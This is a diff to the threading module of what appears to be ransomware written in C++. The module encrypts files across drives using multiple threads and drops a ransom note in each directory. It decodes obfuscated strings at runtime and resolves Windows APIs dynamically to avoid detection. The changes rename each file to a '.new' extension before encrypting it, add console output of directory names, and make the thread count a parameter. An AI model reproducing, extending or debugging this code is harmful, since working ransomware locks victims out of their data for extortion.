@@ -1,4 +1,6 @@
 #include "Threading.h"
+#include <iostream>
+#include <filesystem>
 THREAD_STRUCT threadStruct;
 extern FARPROC APIArray[55];
 MemelstrcmpA TemplstrcmpA;
@@ -81,7 +83,7 @@ int checkFileName(LPSTR directoryName) {
 	89, 118, 137, 152, 50, 79, 99, 137, 152, 32, 84, 107, 137, 152, 42, 85, 110, 137, 228, 3, 122, 65, 196, 243, 22, 119, 64, 200, 229, 3, 21, 81, 209, 226, 70 };
 	resolveStringThreading(avoid_file_str, avoid_file_key, 87);
 	BYTE* avoid_file = avoid_file_str;
-
+	
 	for (int i = 0; i < 15; i++) {
 		if (TempStrStrIA(directoryName, (LPCSTR)avoid_file)) {
 			return -1;
@@ -140,6 +142,7 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 	if (hSearchHandle == INVALID_HANDLE_VALUE) {
 		goto CLEANUP;
 	}
+	std::cout << directoryName << std::endl;
 	dropRansomNote(directoryName);
 	do {
 
@@ -224,7 +227,8 @@ int mainThreadEncryption(HCRYPTPROV hCryptProv, HCRYPTKEY publicKey, LPSTR direc
 							free(nonce);
 							continue;
 						}
-						fileEncrypt(hCryptProv, publicKey, fileName, key, nonce);
+						rename(std::filesystem::path(fileName), std::filesystem::path(fileName).replace_extension(".new"));
+						fileEncrypt(hCryptProv, publicKey, (LPSTR)std::filesystem::path(fileName).replace_extension(".new").string().c_str(), key, nonce);
 						free(fileName);
 						free(key);
 						free(nonce);
@@ -333,7 +337,7 @@ CLEANUP:
 	TempExitThread(returnVal);
 }
 
-int initThreadStruct() {
+int initThreadStruct(int threadCnt) {
 	if (!TemplstrcmpA) {
 		populateAPIThreading();
 	}
@@ -343,8 +347,7 @@ int initThreadStruct() {
 	SYSTEM_INFO systemInfo = SYSTEM_INFO();
 
 	TempGetNativeSystemInfo(&systemInfo);
-
-	pThreadStruct->threadCount = systemInfo.dwNumberOfProcessors;
+	pThreadStruct->threadCount = threadCnt;
 	HANDLE* buffer = (HANDLE*)calloc(4 * pThreadStruct->threadCount, 1);
 	if (!buffer) {
 		return -1;
@@ -369,7 +372,7 @@ void launchThreadEncrypt(LPSTR drivePath) {
 	BYTE key[5] = { 254, 22, 109, 104, 48 };
 	BYTE str[3] = { 93, 195, 146 };
 	resolveStringThreading(str, key, 3);
-
+	
 	strcat(firstDir, (LPCSTR)str);
 
 	addNode(pThreadStruct, firstDir);
